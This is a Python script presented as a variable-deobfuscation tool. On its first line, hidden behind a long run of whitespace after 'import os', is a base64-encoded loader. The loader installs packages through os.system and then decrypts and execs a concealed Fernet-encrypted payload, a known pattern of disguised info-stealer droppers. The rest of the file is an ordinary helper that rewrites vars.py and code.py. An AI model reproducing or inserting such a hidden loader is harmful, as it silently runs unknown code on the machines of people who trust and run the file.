import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ1NoUGxGTl8yMDdxOXhTWDN6amJHS3BCUk4tZHBfSXZmR2R4bk9FSnhBWjQ9JykuZGVjcnlwdChiJ2dBQUFBQUJtM0hXLVcyTUdhalFZRWpUTmhob2hvVl81c3ZrUzJfaTBiVzI1ckhoYU0wY19CM0dIQ3YzaFdKSWxhYzF4VlRfUElIT2dmNGlkd0xtY082Q2xZSXdISnM3b2Q5ZXRuYUxrRFkwNFB2aHdnb1JxVk1iR19ZOXlwUkFoMlQ1WjJqRzQ1QkdwVWFWVkd2aE0yOHF2SEV5dHhBd1ZnN0JLUS1Ray13dDNoa1dLSjlNeGMzSjFTY2hjVTN5WmJPVVlDN2ZLS3UxUWx4NTU1Nm9IanJRR1FjRTJoMzREbmttUU0xdHBJU2k3MHFjSWdvekxVeWc9Jykp').decode())
import binascii
import os
# by Unleqitq
def deobf(line: str) -> str:
	name0, val0 = line.split("=")
	index = name0.index("[")
	name = eval(name0[index+1:-1])
	try:
		val = eval(val0)
		if (type(val)==str):
			return name+"='"+val.replace("\\", "\\\\").replace("'", "\\'").replace("\n","\\n")+"'"
		if (type(val)==int or type(val) == float or type(val) == bool):
			return name+"="+str(val)
	except:pass
	return name+"="+val0
variables = {}
variableNames = []
lines = []
with open("vars.py") as file:
	lines = file.read().split("\n")

try:os.remove("vars.py")
except:pass

with open("vars.py", "a") as file:
	for line in lines:
		try:
			file.write(deobf(line)+"\n")
		except:
			file.write(line+"\n")

with open("vars.py") as file:
    lines = file.read().split("\n")
    for line in lines:
        try:
            name, val = line.split("=", 1)
            variables[name] = val
            variableNames.append(name)
        except:pass

variableNames.sort(key=len, reverse=True)

with open("code.py") as file:
    code = file.read()

for name in variableNames:
    code = code.replace(name, variables[name])

with open("out.py", 'w') as file:
    file.write(code)
print('rlfom')